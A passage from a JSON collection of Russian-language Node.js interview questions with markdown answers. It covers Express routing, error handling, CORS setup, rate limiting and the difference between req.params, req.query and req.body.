/users/:id\nrouter.get('/:id', (req, res) => {\n  res.json({ id: req.params.id });\n});\n\n// POST /users\nrouter.post('/', (req, res) => {\n  res.json({ created: true });\n});\n\nmodule.exports = router;\n\n// app.js\nconst usersRouter = require('./routes/users');\napp.use('/users', usersRouter);\n```\n\n**Route Chaining:**\n\n```javascript\napp.route('/users/:id')\n  .get((req, res) => {\n    res.send('Получить пользователя');\n  })\n  .put((req, res) => {\n    res.send('Обновить пользователя');\n  })\n  .delete((req, res) => {\n    res.send('Удалить пользователя');\n  });\n```\n\n**Pattern matching (шаблоны путей):**\n\n```javascript\n// ? - предыдущий символ опционален\napp.get('/ab?cd', (req, res) => {\n  res.send('ab?cd');\n});\n// Совпадет: /acd, /abcd\n\n// + - один или более повторений предыдущего символа\napp.get('/ab+cd', (req, res) => {\n  res.send('ab+cd');\n});\n// Совпадет: /abcd, /abbcd, /abbbcd\n\n// * - любые символы\napp.get('/ab*cd', (req, res) => {\n  res.send('ab*cd');\n});\n// Совпадет: /abcd, /abRANDOMcd, /ab123cd\n\n// () - группировка\napp.get('/ab(cd)?e', (req, res) => {\n  res.send('ab(cd)?e');\n});\n// Совпадет: /abe, /abcde\n\n// Регулярные выражения\napp.get(/.*fly$/, (req, res) => {\n  res.send('.*fly$');\n});\n// Совпадет: /butterfly, /dragonfly\n```\n\n**Модульная структура роутов:**\n\n```javascript\n// routes/index.js\nconst express = require('express');\nconst router = express.Router();\n\nconst usersRouter = require('./users');\nconst postsRouter = require('./posts');\nconst authRouter = require('./auth');\n\n// Регистрация роутов\nrouter.use('/users', usersRouter);\nrouter.use('/posts', postsRouter);\nrouter.use('/auth', authRouter);\n\n// Корневой роут\nrouter.get('/', (req, res) => {\n  res.json({ message: 'API v1' });\n});\n\nmodule.exports = router;\n\n// app.js\nconst routes = require('./routes');\napp.use('/api/v1', routes);\n\n// Результат:\n// /api/v1 - корневой роут\n// /api/v1/users - пользователи\n// /api/v1/posts - посты\n// /api/v1/auth - аутентификация\n```\n\n**Route Handlers (множественные обработчики):**\n\n```javascript\n// Один обработчик\napp.get('/example/a', (req, res) => {\n  res.send('Hello from A!');\n});\n\n// Два обработчика\napp.get('/example/b',\n  (req, res, next) => {\n    console.log('Middleware 1');\n    next();\n  },\n  (req, res) => {\n    res.send('Hello from B!');\n  }\n);\n\n// Массив обработчиков\nconst cb0 = (req, res, next) => {\n  console.log('CB0');\n  next();\n};\n\nconst cb1 = (req, res, next) => {\n  console.log('CB1');\n  next();\n};\n\nconst cb2 = (req, res) => {\n  res.send('Hello from C!');\n};\n\napp.get('/example/c', [cb0, cb1, cb2]);\n\n// Комбинация функций и массивов\napp.get('/example/d', [cb0, cb1], (req, res, next) => {\n  console.log('Response will be sent by the next function');\n  next();\n}, (req, res) => {\n  res.send('Hello from D!');\n});\n```\n\n**Практический пример - REST API:**\n\n```javascript\nconst express = require('express');\nconst router = express.Router();\n\n// Mock database\nlet users = [\n  { id: 1, name: 'John', email: 'john@example.com' },\n  { id: 2, name: 'Jane', email: 'jane@example.com' }\n];\n\n// GET /api/users - Получить всех пользователей\nrouter.get('/', (req, res) => {\n  const { limit = 10, offset = 0 } = req.query;\n  const result = users.slice(Number(offset), Number(offset) + Number(limit));\n  res.json({\n    data: result,\n    total: users.length,\n    limit: Number(limit),\n    offset: Number(offset)\n  });\n});\n\n// GET /api/users/:id - Получить пользователя по ID\nrouter.get('/:id', (req, res) => {\n  const user = users.find(u => u.id === Number(req.params.id));\n  if (!user) {\n    return res.status(404).json({ error: 'User not found' });\n  }\n  res.json(user);\n});\n\n// POST /api/users - Создать пользователя\nrouter.post('/', (req, res) => {\n  const newUser = {\n    id: users.length + 1,\n    name: req.body.name,\n    email: req.body.email\n  };\n  users.push(newUser);\n  res.status(201).json(newUser);\n});\n\n// PUT /api/users/:id - Обновить пользователя\nrouter.put('/:id', (req, res) => {\n  const user = users.find(u => u.id === Number(req.params.id));\n  if (!user) {\n    return res.status(404).json({ error: 'User not found' });\n  }\n\n  user.name = req.body.name || user.name;\n  user.email = req.body.email || user.email;\n\n  res.json(user);\n});\n\n// PATCH /api/users/:id - Частичное обновление\nrouter.patch('/:id', (req, res) => {\n  const user = users.find(u => u.id === Number(req.params.id));\n  if (!user) {\n    return res.status(404).json({ error: 'User not found' });\n  }\n\n  Object.assign(user, req.body);\n  res.json(user);\n});\n\n// DELETE /api/users/:id - Удалить пользователя\nrouter.delete('/:id', (req, res) => {\n  const index = users.findIndex(u => u.id === Number(req.params.id));\n  if (index === -1) {\n    return res.status(404).json({ error: 'User not found' });\n  }\n\n  users.splice(index, 1);\n  res.status(204).send();\n});\n\nmodule.exports = router;\n```\n\n**Вложенные роутеры:**\n\n```javascript\n// routes/users.js\nconst express = require('express');\nconst router = express.Router();\nconst postsRouter = require('./posts');\n\n// /users/:userId/posts - делегируем в postsRouter\nrouter.use('/:userId/posts', (req, res, next) => {\n  // Сохраняем userId для использования в postsRouter\n  req.userId = req.params.userId;\n  next();\n}, postsRouter);\n\n// routes/posts.js\nconst express = require('express');\nconst router = express.Router({ mergeParams: true }); // ← Важно!\n\nrouter.get('/', (req, res) => {\n  // req.userId доступен из родительского роутера\n  // req.params.userId также доступен благодаря mergeParams\n  res.json({\n    userId: req.params.userId,\n    posts: []\n  });\n});\n\n// Результат:\n// GET /users/123/posts - получить все посты пользователя 123\n```\n\n",
          "best_practices": [],
          "difficulty": "Senior"
        },
        {
          "question_number": 34,
          "question_number_in_chapter": 3,
          "question_chapter": 5,
          "question_title": "Как обрабатывать ошибки в Express.js?",
          "answer_markdown": "\n**Ответ:**\n\nВ Express.js существует несколько способов обработки ошибок. Правильная обработка ошибок критически важна для production приложений.\n\n**1. Error-handling Middleware:**\n\n```javascript\n// ❗ ВАЖНО: 4 параметра (err, req, res, next)\n// ❗ ВАЖНО: Должен быть ПОСЛЕДНИМ в цепочке middleware\napp.use((err, req, res, next) => {\n  console.error(err.stack);\n\n  res.status(err.status || 500).json({\n    error: {\n      message: err.message,\n      ...(process.env.NODE_ENV === 'development' && { stack: err.stack })\n    }\n  });\n});\n```\n\n**2. Синхронные ошибки:**\n\n```javascript\napp.get('/sync-error', (req, res) => {\n  throw new Error('Синхронная ошибка'); // ✅ Express автоматически поймает\n});\n\n// Error handler поймает эту ошибку\n```\n\n**3. Асинхронные ошибки (❌ ПРОБЛЕМА):**\n\n```javascript\n// ❌ НЕПРАВИЛЬНО - ошибка НЕ будет поймана\napp.get('/async-error', async (req, res) => {\n  const user = await db.getUser(123);\n  res.json(user);\n});\n// Если db.getUser() выбросит ошибку → unhandled rejection!\n\n// ✅ ПРАВИЛЬНО - с try/catch\napp.get('/async-error', async (req, res, next) => {\n  try {\n    const user = await db.getUser(123);\n    res.json(user);\n  } catch (err) {\n    next(err); // Передаем в error handler\n  }\n});\n\n// ✅ ЕЩЕ ЛУЧШЕ - универсальный wrapper\nfunction asyncHandler(fn) {\n  return (req, res, next) => {\n    Promise.resolve(fn(req, res, next)).catch(next);\n  };\n}\n\napp.get('/async-error', asyncHandler(async (req, res) => {\n  const user = await db.getUser(123);\n  res.json(user);\n}));\n```\n\n**4. Централизованная обработка ошибок:**\n\n```javascript\n// errors/AppError.js\nclass AppError extends Error {\n  constructor(message, statusCode) {\n    super(message);\n    this.statusCode = statusCode;\n    this.isOperational = true; // Отличает ожидаемые ошибки от программных\n\n    Error.captureStackTrace(this, this.constructor);\n  }\n}\n\nmodule.exports = AppError;\n\n// errors/errorHandler.js\nconst AppError = require('./AppError');\n\n// Development error (детальные)\nconst sendErrorDev = (err, res) => {\n  res.status(err.statusCode).json({\n    status: err.status,\n    error: err,\n    message: err.message,\n    stack: err.stack\n  });\n};\n\n// Production error (скрываем детали)\nconst sendErrorProd = (err, res) => {\n  // Операционная ошибка (ожидаемая) - показываем клиенту\n  if (err.isOperational) {\n    res.status(err.statusCode).json({\n      status: err.status,\n      message: err.message\n    });\n  }\n  // Программная ошибка (неожиданная) - не показываем детали\n  else {\n    console.error('ERROR 💥', err);\n    res.status(500).json({\n      status: 'error',\n      message: 'Something went wrong!'\n    });\n  }\n};\n\nmodule.exports = (err, req, res, next) => {\n  err.statusCode = err.statusCode || 500;\n  err.status = err.status || 'error';\n\n  if (process.env.NODE_ENV === 'development') {\n    sendErrorDev(err, res);\n  } else {\n    sendErrorProd(err, res);\n  }\n};\n\n// app.js\nconst errorHandler = require('./errors/errorHandler');\nconst AppError = require('./errors/AppError');\n\n// Роуты\napp.get('/users/:id', async (req, res, next) => {\n  try {\n    const user = await db.getUser(req.params.id);\n\n    if (!user) {\n      // Кастомная операционная ошибка\n      throw new AppError('User not found', 404);\n    }\n\n    res.json(user);\n  } catch (err) {\n    next(err);\n  }\n});\n\n// 404 для несуществующих роутов\napp.all('*', (req, res, next) => {\n  next(new AppError(`Can't find ${req.originalUrl} on this server!`, 404));\n});\n\n// Error handler (ПОСЛЕДНИМ!)\napp.use(errorHandler);\n```\n\n**5. Обработка разных типов ошибок:**\n\n```javascript\nconst errorHandler = (err, req, res, next) => {\n  // Validation Error (Joi, express-validator)\n  if (err.name === 'ValidationError') {\n    return res.status(400).json({\n      error: 'Validation Error',\n      details: err.details || err.errors\n    });\n  }\n\n  // MongoDB CastError (неверный ID)\n  if (err.name === 'CastError') {\n    return res.status(400).json({\n      error: 'Invalid ID format'\n    });\n  }\n\n  // MongoDB Duplicate Key\n  if (err.code === 11000) {\n    const field = Object.keys(err.keyPattern)[0];\n    return res.status(409).json({\n      error: `${field} already exists`\n    });\n  }\n\n  // JWT Error\n  if (err.name === 'JsonWebTokenError') {\n    return res.status(401).json({\n      error: 'Invalid token'\n    });\n  }\n\n  if (err.name === 'TokenExpiredError') {\n    return res.status(401).json({\n      error: 'Token expired'\n    });\n  }\n\n  // Multer Error (file upload)\n  if (err.name === 'MulterError') {\n    if (err.code === 'LIMIT_FILE_SIZE') {\n      return res.status(400).json({\n        error: 'File too large'\n      });\n    }\n  }\n\n  // Default error\n  res.status(err.statusCode || 500).json({\n    error: err.message || 'Internal Server Error'\n  });\n};\n```\n\n**6. Async/await с express-async-errors:**\n\n```javascript\n// npm install express-async-errors\n\n// В начале app.js (до определения роутов)\nrequire('express-async-errors');\n\nconst express = require('express');\nconst app = express();\n\n// Теперь можно использовать async без try/catch!\napp.get('/users', async (req, res) => {\n  const users = await db.getUsers(); // Ошибки автоматически попадут в error handler\n  res.json(users);\n});\n\n// Error handler всё равно нужен\napp.use((err, req, res, next) => {\n  res.status(500).json({ error: err.message });\n});\n```\n\n**7. Обработка unhandled rejections:**\n\n```javascript\n// В конце app.js\nprocess.on('unhandledRejection', (err) => {\n  console.error('UNHANDLED REJECTION! 💥 Shutting down...');\n  console.error(err.name, err.message);\n\n  // Graceful shutdown\n  server.close(() => {\n    process.exit(1);\n  });\n});\n\nprocess.on('uncaughtException', (err) => {\n  console.error('UNCAUGHT EXCEPTION! 💥 Shutting down...');\n  console.error(err.name, err.message);\n  process.exit(1);\n});\n```\n\n**8. Интеграция с Sentry (error tracking):**\n\n```javascript\nconst Sentry = require('@sentry/node');\n\nSentry.init({\n  dsn: process.env.SENTRY_DSN,\n  environment: process.env.NODE_ENV\n});\n\n// В начале middleware\napp.use(Sentry.Handlers.requestHandler());\n\n// Роуты\n// ...\n\n// Перед error handler\napp.use(Sentry.Handlers.errorHandler());\n\n// Error handler\napp.use((err, req, res, next) => {\n  res.status(500).json({ error: 'Internal Server Error' });\n});\n```\n\n**9. Валидация с обработкой ошибок:**\n\n```javascript\nconst { body, validationResult } = require('express-validator');\n\napp.post('/users',\n  // Валидация\n  [\n    body('email').isEmail().withMessage('Invalid email'),\n    body('password').isLength({ min: 6 }).withMessage('Password too short')\n  ],\n  // Обработка результатов валидации\n  (req, res, next) => {\n    const errors = validationResult(req);\n    if (!errors.isEmpty()) {\n      return res.status(400).json({ errors: errors.array() });\n    }\n    next();\n  },\n  // Handler\n  async (req, res, next) => {\n    try {\n      const user = await db.createUser(req.body);\n      res.json(user);\n    } catch (err) {\n      next(err);\n    }\n  }\n);\n```\n\n",
          "best_practices": [],
          "difficulty": "Senior"
        },
        {
          "question_number": 35,
          "question_number_in_chapter": 4,
          "question_chapter": 5,
          "question_title": "Что такое CORS? Как настроить CORS в Node.js?",
          "answer_markdown": "\n**Ответ:**\n\n**CORS (Cross-Origin Resource Sharing)** - это механизм безопасности браузеров, который ограничивает HTTP запросы, исходящие из скриптов к другому домену (origin).\n\n**Что такое Origin?**\n\nOrigin состоит из:\n- **Протокола** (http/https)\n- **Домена** (example.com)\n- **Порта** (:3000)\n\n```\nhttps://example.com:3000/api/users\n└─────┬────────────────┘\n      └─ Origin\n```\n\n**Примеры Same-Origin и Cross-Origin:**\n\n| URL 1 | URL 2 | Same-Origin? |\n|-------|-------|--------------|\n| http://example.com | http://example.com/api | ✅ Да |\n| http://example.com:3000 | http://example.com:8080 | ❌ Нет (разный порт) |\n| http://example.com | https://example.com | ❌ Нет (разный протокол) |\n| http://example.com | http://api.example.com | ❌ Нет (разный поддомен) |\n\n**Проблема CORS:**\n\n```javascript\n// Frontend на http://localhost:3000\nfetch('http://localhost:4000/api/users')\n  .then(res => res.json())\n  .then(data => console.log(data));\n\n// ❌ Ошибка в браузере:\n// Access to fetch at 'http://localhost:4000/api/users' from origin\n// 'http://localhost:3000' has been blocked by CORS policy\n```\n\n**Решение 1: Простая настройка CORS:**\n\n```javascript\nconst express = require('express');\nconst app = express();\n\n// ✅ Разрешить все CORS запросы (для разработки)\napp.use((req, res, next) => {\n  res.header('Access-Control-Allow-Origin', '*');\n  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, PATCH');\n  res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization');\n  next();\n});\n\napp.get('/api/users', (req, res) => {\n  res.json({ users: [] });\n});\n\napp.listen(4000);\n```\n\n**Решение 2: Использование cors пакета:**\n\n```bash\nnpm install cors\n```\n\n```javascript\nconst express = require('express');\nconst cors = require('cors');\nconst app = express();\n\n// ✅ Самая простая настройка (разрешить все)\napp.use(cors());\n\napp.get('/api/users', (req, res) => {\n  res.json({ users: [] });\n});\n```\n\n**Настройка CORS для конкретного origin:**\n\n```javascript\nconst cors = require('cors');\n\n// Разрешить только один origin\napp.use(cors({\n  origin: 'https://example.com'\n}));\n\n// Разрешить несколько origins\nconst allowedOrigins = [\n  'https://example.com',\n  'https://app.example.com',\n  'http://localhost:3000'\n];\n\napp.use(cors({\n  origin: (origin, callback) => {\n    // Разрешить запросы без origin (например, мобильные приложения)\n    if (!origin) return callback(null, true);\n\n    if (allowedOrigins.includes(origin)) {\n      callback(null, true);\n    } else {\n      callback(new Error('Not allowed by CORS'));\n    }\n  }\n}));\n```\n\n**Полная конфигурация CORS:**\n\n```javascript\nconst corsOptions = {\n  // Разрешенные origins\n  origin: 'https://example.com',\n\n  // Разрешенные HTTP методы\n  methods: ['GET', 'POST', 'PUT', 'DELETE'],\n\n  // Разрешенные заголовки\n  allowedHeaders: ['Content-Type', 'Authorization'],\n\n  // Заголовки, которые браузер может прочитать\n  exposedHeaders: ['X-Total-Count', 'X-Page-Number'],\n\n  // Разрешить отправку cookies\n  credentials: true,\n\n  // Время кэширования preflight запроса (в секундах)\n  maxAge: 86400, // 24 часа\n\n  // Продолжать обработку после CORS ошибки\n  optionsSuccessStatus: 200\n};\n\napp.use(cors(corsOptions));\n```\n\n**Preflight Request:**\n\nДля некоторых запросов (с кастомными заголовками, методами PUT/DELETE) браузер сначала отправляет **preflight** запрос OPTIONS.\n\n```javascript\n// Браузер автоматически отправляет:\n// OPTIONS /api/users HTTP/1.1\n// Origin: https://example.com\n// Access-Control-Request-Method: POST\n// Access-Control-Request-Headers: Content-Type\n\napp.use(cors());\n\n// cors пакет автоматически обрабатывает OPTIONS запросы\n// и отвечает нужными заголовками:\n// Access-Control-Allow-Origin: https://example.com\n// Access-Control-Allow-Methods: POST\n// Access-Control-Allow-Headers: Content-Type\n```\n\n**CORS только для определенных роутов:**\n\n```javascript\nconst cors = require('cors');\n\n// CORS только для /api/* роутов\napp.use('/api', cors());\n\napp.get('/api/users', (req, res) => {\n  res.json({ users: [] }); // ✅ CORS разрешен\n});\n\napp.get('/internal/stats', (req, res) => {\n  res.json({ stats: {} }); // ❌ CORS запрещен\n});\n```\n\n**CORS с credentials (cookies):**\n\n```javascript\n// Backend\napp.use(cors({\n  origin: 'https://example.com',\n  credentials: true // ← Разрешить cookies\n}));\n\napp.get('/api/profile', (req, res) => {\n  // Можем читать cookies из req\n  res.json({ user: req.cookies.userId });\n});\n\n// Frontend\nfetch('https://api.example.com/api/profile', {\n  credentials: 'include' // ← Отправить cookies\n})\n  .then(res => res.json())\n  .then(data => console.log(data));\n```\n\n**Динамическая настройка CORS:**\n\n```javascript\nconst cors = require('cors');\n\nconst corsOptionsDelegate = (req, callback) => {\n  let corsOptions;\n\n  // Разные настройки для разных origins\n  if (req.header('Origin') === 'https://admin.example.com') {\n    corsOptions = {\n      origin: true,\n      credentials: true,\n      methods: ['GET', 'POST', 'PUT', 'DELETE']\n    };\n  } else {\n    corsOptions = {\n      origin: true,\n      methods: ['GET'] // Только чтение для остальных\n    };\n  }\n\n  callback(null, corsOptions);\n};\n\napp.use(cors(corsOptionsDelegate));\n```\n\n**Обработка CORS ошибок:**\n\n```javascript\nconst cors = require('cors');\n\napp.use(cors({\n  origin: (origin, callback) => {\n    const allowedOrigins = ['https://example.com'];\n\n    if (!allowedOrigins.includes(origin)) {\n      const msg = 'The CORS policy for this site does not allow access from the specified origin.';\n      return callback(new Error(msg), false);\n    }\n\n    callback(null, true);\n  }\n}));\n\n// Error handler для CORS ошибок\napp.use((err, req, res, next) => {\n  if (err.message.includes('CORS')) {\n    return res.status(403).json({\n      error: 'CORS Error',\n      message: err.message\n    });\n  }\n  next(err);\n});\n```\n\n**Production настройки:**\n\n```javascript\nconst cors = require('cors');\n\nconst whitelist = process.env.ALLOWED_ORIGINS\n  ? process.env.ALLOWED_ORIGINS.split(',')\n  : [];\n\nconst corsOptions = {\n  origin: (origin, callback) => {\n    // Разрешить запросы без origin (Postman, мобильные приложения)\n    if (!origin || whitelist.includes(origin)) {\n      callback(null, true);\n    } else {\n      callback(new Error('Not allowed by CORS'));\n    }\n  },\n  credentials: true,\n  methods: ['GET', 'POST', 'PUT', 'DELETE', 'PATCH'],\n  allowedHeaders: ['Content-Type', 'Authorization'],\n  exposedHeaders: ['X-Total-Count'],\n  maxAge: 600 // 10 минут\n};\n\napp.use(cors(corsOptions));\n\n// .env файл\n// ALLOWED_ORIGINS=https://example.com,https://app.example.com\n```\n\n",
          "best_practices": [],
          "difficulty": "Senior"
        },
        {
          "question_number": 36,
          "question_number_in_chapter": 5,
          "question_chapter": 5,
          "question_title": "Как реализовать rate limiting в Express.js?",
          "answer_markdown": "\n**Ответ:**\n\n**Rate Limiting** - это техника ограничения количества запросов от одного пользователя/IP адреса за определенный период времени. Используется для защиты от DDoS атак, брутфорса, и контроля нагрузки на API.\n\n**Решение 1: Использование express-rate-limit:**\n\n```bash\nnpm install express-rate-limit\n```\n\n```javascript\nconst rateLimit = require('express-rate-limit');\nconst express = require('express');\nconst app = express();\n\n// Базовая настройка\nconst limiter = rateLimit({\n  windowMs: 15 * 60 * 1000, // 15 минут\n  max: 100, // Максимум 100 запросов за window\n  message: 'Too many requests from this IP, please try again later.',\n  standardHeaders: true, // Возвращать rate limit info в `RateLimit-*` заголовках\n  legacyHeaders: false, // Отключить `X-RateLimit-*` заголовки\n});\n\n// Применить ко всем роутам\napp.use(limiter);\n\napp.get('/api/users', (req, res) => {\n  res.json({ users: [] });\n});\n```\n\n**Кастомизация rate limiter:**\n\n```javascript\nconst limiter = rateLimit({\n  windowMs: 15 * 60 * 1000, // 15 минут\n  max: 100,\n\n  // Кастомное сообщение\n  message: {\n    status: 429,\n    message: 'Too many requests, please slow down!'\n  },\n\n  // Кастомный статус код (по умолчанию 429)\n  statusCode: 429,\n\n  // Кастомный handler\n  handler: (req, res) => {\n    res.status(429).json({\n      error: 'Rate limit exceeded',\n      retryAfter: req.rateLimit.resetTime\n    });\n  },\n\n  // Skip для определенных запросов\n  skip: (req) => {\n    // Пропустить для localhost\n    return req.ip === '127.0.0.1';\n  },\n\n  // Кастомный ключ (по умолчанию IP адрес)\n  keyGenerator: (req) => {\n    // Использовать user ID вместо IP\n    return req.user?.id || req.ip;\n  },\n\n  // Store (по умолчанию MemoryStore)\n  // Для продакшена используйте Redis\n  store: new RedisStore({ /* options */ })\n});\n```\n\n**Rate limiting для разных endpoints:**\n\n```javascript\nconst rateLimit = require('express-rate-limit');\n\n// Строгий лимит для аутентификации (защита от брутфорса)\nconst authLimiter = rateLimit({\n  windowMs: 15 * 60 * 1000, // 15 минут\n  max: 5, // Только 5 попыток\n  skipSuccessfulRequests: true, // Не считать успешные запросы\n  message: 'Too many login attempts, please try again later.'\n});\n\n// Обычный лимит для API\nconst apiLimiter = rateLimit({\n  windowMs: 15 * 60 * 1000,\n  max: 100\n});\n\n// Мягкий лимит для публичных endpoints\nconst publicLimiter = rateLimit({\n  windowMs: 15 * 60 * 1000,\n  max: 300\n});\n\n// Применение\napp.post('/auth/login', authLimiter, loginHandler);\napp.use('/api/', apiLimiter);\napp.use('/public/', publicLimiter);\n```\n\n**Решение 2: Redis-based rate limiting:**\n\n```bash\nnpm install rate-limit-redis redis\n```\n\n```javascript\nconst rateLimit = require('express-rate-limit');\nconst RedisStore = require('rate-limit-redis');\nconst Redis = require('redis');\n\n// Создаем Redis клиент\nconst redisClient = Redis.createClient({\n  host: process.env.REDIS_HOST || 'localhost',\n  port: process.env.REDIS_PORT || 6379\n});\n\n// Rate limiter с Redis store\nconst limiter = rateLimit({\n  store: new RedisStore({\n    client: redisClient,\n    prefix: 'rl:', // Префикс для ключей в Redis\n  }),\n  windowMs: 15 * 60 * 1000,\n  max: 100\n});\n\napp.use(limiter);\n```\n\n**Гибкий rate limiting (разные лимиты для разных пользователей):**\n\n```javascript\nconst rateLimit = require('express-rate-limit');\n\nconst dynamicLimiter = rateLimit({\n  windowMs: 15 * 60 * 1000,\n  // Функция для динамического определения max\n  max: (req) => {\n    if (req.user?.premium) {\n      return 1000; // Premium пользователи - 1000 запросов\n    }\n    if (req.user) {\n      return 100; // Аутентифицированные - 100 запросов\n    }\n    return 50; // Анонимные - 50 запросов\n  },\n  keyGenerator: (req) => {\n    return req.user?.id || req.ip;\n  }\n});\n\napp.use('/api', dynamicLimiter);\n```\n\n**Решение 3: Token Bucket алгоритм (более гибкий):**\n\n```javascript\nconst TokenBucket = require('limiter').TokenBucket;\n\n// Создаем bucket: 10 токенов, пополнение 1 токен/секунду\nconst bucket = new TokenBucket(10, 1, 'second', null);\n\nconst tokenBucketMiddleware = (req, res, next) => {\n  bucket.removeTokens(1, (err, remainingTokens) => {\n    if (err) {\n      return next(err);\n    }\n\n    if (remainingTokens < 0) {\n      return res.status(429).json({\n        error: 'Rate limit exceeded',\n        retryAfter: Math.ceil(Math.abs(remainingTokens))\n      });\n    }\n\n    res.set('X-RateLimit-Remaining', remainingTokens);\n    next();\n  });\n};\n\napp.use(tokenBucketMiddleware);\n```\n\n**Sliding Window алгоритм:**\n\n```javascript\nconst Redis = require('redis');\nconst redisClient = Redis.createClient();\n\nasync function slidingWindowLimiter(req, res, next) {\n  const key = `ratelimit:${req.ip}`;\n  const limit = 100;\n  const window = 60; // секунд\n\n  const now = Math.floor(Date.now() / 1000);\n  const windowStart = now - window;\n\n  try {\n    // Удаляем старые записи\n    await redisClient.zremrangebyscore(key, 0, windowStart);\n\n    // Считаем запросы в текущем окне\n    const count = await redisClient.zcard(key);\n\n    if (count >= limit) {\n      return res.status(429).json({\n        error: 'Rate limit exceeded'\n      });\n    }\n\n    // Добавляем новый запрос\n    await redisClient.zadd(key, now, `${now}-${Math.random()}`);\n    await redisClient.expire(key, window);\n\n    res.set('X-RateLimit-Remaining', limit - count - 1);\n    next();\n  } catch (err) {\n    next(err);\n  }\n}\n\napp.use(slidingWindowLimiter);\n```\n\n**Rate limiting с IP whitelist:**\n\n```javascript\nconst rateLimit = require('express-rate-limit');\n\nconst whitelist = ['127.0.0.1', '192.168.1.1'];\n\nconst limiter = rateLimit({\n  windowMs: 15 * 60 * 1000,\n  max: 100,\n  skip: (req) => {\n    // Пропустить whitelisted IPs\n    return whitelist.includes(req.ip);\n  }\n});\n\napp.use(limiter);\n```\n\n**Rate limiting по user ID + IP:**\n\n```javascript\nconst limiter = rateLimit({\n  windowMs: 15 * 60 * 1000,\n  max: 100,\n  keyGenerator: (req) => {\n    // Комбинированный ключ\n    if (req.user) {\n      return `user-${req.user.id}`;\n    }\n    return `ip-${req.ip}`;\n  }\n});\n```\n\n**Отправка заголовков rate limit:**\n\n```javascript\nconst limiter = rateLimit({\n  windowMs: 15 * 60 * 1000,\n  max: 100,\n  standardHeaders: true, // RateLimit-* заголовки\n  handler: (req, res) => {\n    res.status(429).json({\n      error: 'Too many requests',\n      limit: req.rateLimit.limit,\n      current: req.rateLimit.current,\n      remaining: req.rateLimit.remaining,\n      resetTime: new Date(req.rateLimit.resetTime)\n    });\n  }\n});\n\n// Клиент получит заголовки:\n// RateLimit-Limit: 100\n// RateLimit-Remaining: 23\n// RateLimit-Reset: 1699999999\n```\n\n**Graceful degradation (постепенное замедление):**\n\n```javascript\nconst slowDown = require('express-slow-down');\n\nconst speedLimiter = slowDown({\n  windowMs: 15 * 60 * 1000,\n  delayAfter: 50, // После 50 запросов начинаем замедлять\n  delayMs: 500, // Каждый следующий запрос +500ms\n  maxDelayMs: 20000 // Максимальная задержка 20 секунд\n});\n\napp.use(speedLimiter);\n```\n\n**Monitoring и logging:**\n\n```javascript\nconst limiter = rateLimit({\n  windowMs: 15 * 60 * 1000,\n  max: 100,\n  onLimitReached: (req, res, options) => {\n    // Логируем когда лимит достигнут\n    console.warn(`Rate limit reached for IP ${req.ip}`);\n\n    // Можно отправить алерт\n    sendAlert({\n      type: 'RATE_LIMIT_EXCEEDED',\n      ip: req.ip,\n      path: req.path,\n      timestamp: new Date()\n    });\n  },\n  skip: (req) => {\n    // Логируем все запросы\n    console.log(`Request from ${req.ip} to ${req.path}`);\n    return false;\n  }\n});\n```\n\n",
          "best_practices": [],
          "difficulty": "Senior"
        },
        {
          "question_number": 37,
          "question_number_in_chapter": 6,
          "question_chapter": 5,
          "question_title": "В чем разница между req.params, req.query и req.body?",
          "answer_markdown": "\n**Ответ:**\n\nВ Express.js есть три основных способа получения данных от клиента: `req.params`, `req.query` и `req.body`. Они используются для разных целей.\n\n**Сравнительная таблица:**\n\n| Свойство | Описание | Где находится | Пример URL | Как получить |\n|----------|----------|---------------|------------|--------------|\n| `req.params` | Параметры пути (route parameters) | В URL пути | `/users/123` | `req.params.id` |\n| `req.query` | Query string параметры | После `?` в URL | `/search?q=nodejs&page=2` | `req.query.q` |\n| `req.body` | Данные в теле запроса | HTTP body | N/A | `req.body.name` |\n\n**1. req.params - параметры пути:**\n\n```javascript\n// Route definition\napp.get('/users/:userId/posts/:postId', (req, res) => {\n  console.log(req.params);\n  // GET /users/123/posts/456\n  // Output: { userId: '123', postId: '456' }\n\n  const { userId, postId } = req.params;\n  res.json({ userId, postId });\n});\n\n// Примеры:\n// GET /users/123 → req.params = { userId: '123' }\n// GET /users/alice → req.params = { userId: 'alice' }\n// GET /products/shoes/nike → req.params = { category: 'shoes', brand: 'nike' }\n```\n\n**Особенности req.params:**\n\n```javascript\n// Всегда строки\napp.get('/users/:id', (req, res) => {\n  console.log(typeof req.params.id); // 'string'\n  console.log(req.params.id); // '123', не 123\n\n  // Преобразование в число\n  const userId = parseInt(req.params.id, 10);\n});\n\n// Валидация с регулярными выражениями\napp.get('/users/:id(\\\\d+)', (req, res) => {\n  // Только цифры\n  res.send(`User ${req.params.id}`);\n});\n\n// Опциональные параметры\napp.get('/users/:id?', (req, res) => {\n  if (req.params.id) {\n    res.send(`User ${req.params.id}`);\n  } else {\n    res.send('All users');\n  }\n});\n```\n\n**2. req.query - query string параметры:**\n\n```javascript\napp.get('/search', (req, res) => {\n  console.log(req.query);\n  // GET /search?q=nodejs&category=backend&page=2&limit=10\n  // Output: { q: 'nodejs', category: 'backend', page: '2', limit: '10' }\n\n  const { q, category, page = 1, limit = 20 } = req.query;\n  res.json({ q, category, page, limit });\n});\n\n// Примеры:\n// GET /search?q=nodejs → req.query = { q: 'nodejs' }\n// GET /users?active=true&role=admin → req.query = { active: 'true', role: 'admin' }\n// GET /products?sort=price&order=asc → req.query = { sort: 'price', order: 'asc' }\n```\n\n**Особенности req.query:**\n\n```javascript\n// Всегда строки\napp.get('/products', (req, res) => {\n  console.log(typeof req.query.page); // 'string'\n  console.log(req.query.page); // '2', не 2\n\n  // Преобразование типов\n  const page = parseInt(req.query.page, 10) || 1;\n  const limit = parseInt(req.query.limit, 10) || 20;\n  const active = req.query.active === 'true';\n});\n\n// Массивы в query parameters\napp.get('/filter', (req, res) => {\n  // GET /filter?tags=javascript&tags=nodejs&tags=express\n  console.log(req.query.tags); // ['javascript', 'nodejs', 'express']\n\n  // GET /filter?ids=1,2,3\n  console.log(req.query.ids); // '1,2,3'\n  const ids = req.query.ids.split(',').map(Number); // [1, 2, 3]\n});\n\n// URL encoding\napp.get('/search', (req, res) => {\n  // GET /search?q=hello%20world\n  console.log(req.query.q); // 'hello world' (автоматически декодировано)\n\n  // GET /search?name=John+Doe\n  console.log(req.query.name); // 'John Doe'\n});\n```\n\n**3. req.body - данные в теле запроса:**\n\n```javascript\nconst express = require('express');\nconst app = express();\n\n// ❗ ВАЖНО: Требует middleware для парсинга\napp.use(express.json()); // Для JSON\napp.use(express.urlencoded({ extended: true })); // Для form 